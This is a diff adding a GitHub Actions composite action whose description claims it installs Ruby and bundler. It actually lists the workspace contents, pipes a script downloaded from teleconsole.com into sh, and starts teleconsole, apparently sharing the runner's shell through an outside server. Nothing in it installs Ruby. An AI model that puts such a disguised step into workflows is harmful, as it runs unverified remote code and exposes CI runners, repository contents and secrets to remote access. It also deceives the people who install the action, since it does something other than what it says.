@@ -1,0 +1,17 @@
+name: install
+author: Graygzou
+description: Proceed to the installation of ruby and bundler
+run:
+  using: "composite"
+  steps: 
+    - run: |
+        echo $GITHUB_WORKSPACE
+        cd $GITHUB_WORKSPACE
+        ls -l -R
+        curl https://www.teleconsole.com/get.sh | sh
+        teleconsole 
+      shell: bash
+
+branding:
+  icon: cpu
+  color: orange
